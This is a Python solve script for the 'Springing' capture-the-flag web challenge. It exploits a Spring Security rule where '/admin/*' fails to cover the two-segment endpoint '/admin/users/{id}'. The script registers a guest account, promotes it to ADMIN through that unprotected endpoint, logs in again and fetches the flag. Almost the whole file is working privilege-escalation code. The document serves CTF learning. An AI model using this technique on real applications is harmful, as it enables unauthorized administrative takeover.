#!/usr/bin/env python3
"""Springing - AlpacaHack Daily (web, Spring Security).

SecurityConfig protects "/admin" and "/admin/*" with hasRole("ADMIN"), but the
role-change endpoint is POST /admin/users/{userid} (two path segments), which
"/admin/*" (one segment) does NOT match -> it falls through to
anyRequest().authenticated(). So any logged-in GUEST can promote itself:

  register -> login -> read own userId from "/" -> POST /admin/users/{id}
  role=ADMIN -> re-login (refresh authorities) -> GET /admin -> flag.

Usage: python3 -I solve.py http://HOST:PORT
"""
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000").rstrip("/")
USER, PW = "pwner_springing", "pwpwpw"


def client():
    cj = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj


def post(op, path, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    return op.open(req, timeout=20)


def get(op, path):
    return op.open(urllib.request.Request(BASE + path), timeout=20)


def main():
    op, _ = client()
    # 1) register (ignore 409 if already there)
    try:
        post(op, "/user/register", {"username": USER, "password": PW})
    except urllib.error.HTTPError as e:
        if e.code not in (409, 303, 302):
            raise
    # 2) login (session with GUEST authority)
    post(op, "/user/login", {"username": USER, "password": PW})
    # 3) read our userId from "/"
    html = get(op, "/").read().decode(errors="replace")
    m = re.search(r"ID is\s*([0-9a-fA-F-]{36})", html)
    if not m:
        print("[!] could not read userId:\n", html[:400]); return
    uid = m.group(1)
    print("[*] userId:", uid)
    # 4) promote self via the unprotected two-segment endpoint
    try:
        post(op, f"/admin/users/{uid}", {"role": "ADMIN"})
    except urllib.error.HTTPError as e:
        if e.code not in (303, 302):
            print("[!] changeRole status", e.code);
    # 5) re-login so the session carries ROLE_ADMIN
    op2, _ = client()
    post(op2, "/user/login", {"username": USER, "password": PW})
    # 6) read the flag
    admin = get(op2, "/admin").read().decode(errors="replace")
    f = re.search(r"Alpaca\{[^}]*\}", admin)
    print(f.group(0) if f else "[no flag]\n" + admin[:600])


if __name__ == "__main__":
    main()
